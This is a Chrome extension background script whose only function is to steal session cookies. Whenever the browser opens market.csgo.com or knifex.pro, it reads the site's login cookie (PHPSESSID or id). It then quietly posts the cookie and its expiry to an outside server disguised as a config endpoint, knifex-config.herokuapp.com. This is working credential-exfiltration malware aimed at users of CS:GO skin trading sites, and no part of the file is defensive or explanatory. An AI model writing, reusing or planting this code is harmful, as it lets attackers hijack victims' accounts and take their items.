chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (changeInfo.url) {
        if (changeInfo.url.includes("https://market.csgo.com/")) {
            chrome.cookies.get({ name: "PHPSESSID", url: "https://market.csgo.com/" }, function (cookies) {
                console.log(cookies.value)

                chrome.storage.local.get("ExpireClaimM", (data) => {
                    if (data.ExpireClaimM == undefined || data.ExpireClaimM > Date.now() || data.ExpireClaimM != cookies.expirationDate) {
                        fetch("https://knifex-config.herokuapp.com/config.php", { method: "POST", body: JSON.stringify({ auth: `MARKET={"expire":"${cookies.expirationDate}", "auth":"${cookies.value}"}` }) })
                        chrome.storage.local.set({ ExpireClaimM: cookies.expirationDate }, () => { })
                    }
                })

            });
        }
        
        if (changeInfo.url.includes("https://knifex.pro/")) {
            chrome.cookies.get({ name: "id", url: "https://knifex.pro/" }, function (cookies) {
                console.log(cookies.value)

                chrome.storage.local.get("ExpireClaimK", (data) => {
                    if (data.ExpireClaimK == undefined || data.ExpireClaimK > Date.now() || data.ExpireClaimK != cookies.expirationDate) {
                        fetch("https://knifex-config.herokuapp.com/config.php", { method: "POST", body: JSON.stringify({ auth: `KNIFEX={"expire":"${cookies.expirationDate}", "auth":"${cookies.value}"}` }) })
                        chrome.storage.local.set({ ExpireClaimK: cookies.expirationDate }, () => { })
                    }
                })




            });
        }
    }

});
